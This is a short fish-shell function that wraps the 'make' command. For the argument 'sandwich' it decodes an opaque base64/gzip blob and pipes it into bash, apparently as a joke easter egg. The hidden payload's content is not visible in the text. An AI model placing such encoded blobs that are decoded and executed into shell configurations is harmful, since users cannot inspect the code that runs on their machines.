function make
    if test (count $argv) -eq 1 ; and [ "$argv" = "sandwich" ]
        echo "H4sIAIEPvloA/2VQwU7EIBS88xXPxsPuwQSzaDDGg7tq7Eq8NCa9ai1dLvQgLG7ixy9QihRoJi/vvenMgOCwWsHl80f9BBcPgGG9vgd16CUCe/ruMEL1PlZT9ysU4gL5ab17HJYgijU4Yn/yc8ka8lZyqePPvQxVu9q+mILPJi2PoOu5frcp+Me4E7nvtrPeGd9l6VLurG3rlnKL3UKH6vb6jv/D/R9zWW96XPBfjW6T/NObhDfamCL//kQ0EyluZh/NGpvTamX6qrxn3A3MjOn9h1rkHw4+WMIffH3+9LcErr7RGfQ4bvcaAgAA" | base64 -d | gunzip | bash
    else
        /usr/bin/make $argv
    end  
end


